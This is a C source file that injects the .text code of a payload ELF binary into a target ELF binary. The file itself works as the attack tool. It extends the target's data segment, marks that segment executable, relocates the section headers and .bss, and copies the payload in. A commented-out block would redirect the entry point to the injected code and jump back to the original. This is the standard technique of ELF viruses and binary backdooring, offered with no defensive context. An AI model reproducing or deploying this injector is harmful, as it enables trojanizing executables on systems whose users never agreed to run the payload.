#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/mman.h>

#define PLACEHOLDER_BYTE 0x11
#define BACKWARD_JUMP_VALUE 43


int open_map_elf(char* filename, uint8_t** data, int padding) {
  int fd, size;

  if ((fd = open(filename, O_RDWR)) < 0) {
    perror("Opening file");
    exit(1);
  }

  size = lseek(fd, 0, SEEK_END);

  *data = mmap(0, size + padding, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  return fd;
}

Elf64_Shdr* find_elf64_sections (uint8_t* data, char* name) {
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
  Elf64_Shdr *shdr = (Elf64_Shdr*)(data + ehdr->e_shoff);
  
  char* sname;
  const char* sh_strtab_p = data + shdr[ehdr->e_shstrndx].sh_offset;
  int section_idx;
  for (int i = 0; i < ehdr->e_shnum; i++) {
    sname = (char*)(sh_strtab_p + shdr[i].sh_name);
    if (!strcmp(name, sname)) {
      printf("Found %s at section %d\n", name, i);
      return &shdr[i];
    }
  }
  perror("Cannot find elf section");
  exit(-1);
}

Elf64_Phdr* find_data_segment (uint8_t* data) {
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
  Elf64_Phdr *phdr = (Elf64_Phdr*)(data + ehdr->e_phoff);
  
  int text_idx;
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if ((phdr[i].p_flags & 6) == 6 && phdr[i].p_type == PT_LOAD) {
      printf("Data segment found at %d\n", i);
      return &phdr[i];
    }
  }
  perror("Failed to find code segment");
  exit(1);
}

short int* find_placeholder(uint8_t* byte) {
  while (*byte != PLACEHOLDER_BYTE)
    byte += 1;
  return (short int*)byte;
}

int main(int argc, char* argv[]) {
  int target_fd, payload_fd;
  uint8_t *target_data, *payload_data;

  if (argc != 3) {
    printf("Usage: %s <src> <payload>\n", argv[0]);
    return 0;
  }

  payload_fd = open_map_elf(argv[2], &payload_data, 0);

  // Locate relevant code in payload binary.
  int payload_size;
  uint8_t* payload_code;
  Elf64_Shdr* payload_text_shdr = find_elf64_sections(payload_data, ".text");
  payload_size = payload_text_shdr->sh_size;
  printf("Payload size:  0x%x\n", payload_size);
  payload_code = payload_data + payload_text_shdr->sh_offset;

  target_fd = open_map_elf(argv[1], &target_data, payload_size);
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)target_data;
  Elf64_Shdr* shdr = (Elf64_Shdr*)(target_data + ehdr->e_shoff);
  Elf64_Phdr *phdr = (Elf64_Phdr*)(target_data + ehdr->e_phoff);

  Elf64_Phdr* data_seg = find_data_segment(target_data);
  Elf64_Shdr* bss = find_elf64_sections(target_data, ".bss");
  
  // Push down section headers.
  ehdr->e_shoff += payload_size;
  
  uint8_t* data_segment_end = target_data + data_seg->p_offset + data_seg->p_filesz; 

  // Adjust data segment.
  data_seg->p_filesz += payload_size;
  data_seg->p_memsz += payload_size;
  data_seg->p_flags |= PF_X;

  // Adjust .bss section.
  bss->sh_addr += payload_size;
  bss->sh_offset += payload_size;

  // Copy payload to code cave.
  int bytes_to_move = lseek(target_fd, 0, SEEK_END) - data_seg->p_offset - data_seg->p_filesz; 
  memmove(data_segment_end + payload_size, data_segment_end, bytes_to_move);

  memmove(data_segment_end, payload_code, payload_size); 

/*
  // Adjust entry point to point to code cave.
  int data_end_offset = data_seg->p_offset + data_seg->p_filesz;
  int dist_to_end = data_end_offset - ehdr->e_entry;
  ehdr->e_entry = data_end_offset;

  // Patch relative jump to revert control flow to original entry.
  short int* place = find_placeholder(data_segment_end);
  *place = dist_to_end + BACKWARD_JUMP_VALUE;
*/

  close(target_fd);
  close(payload_fd);

  return 0;
}
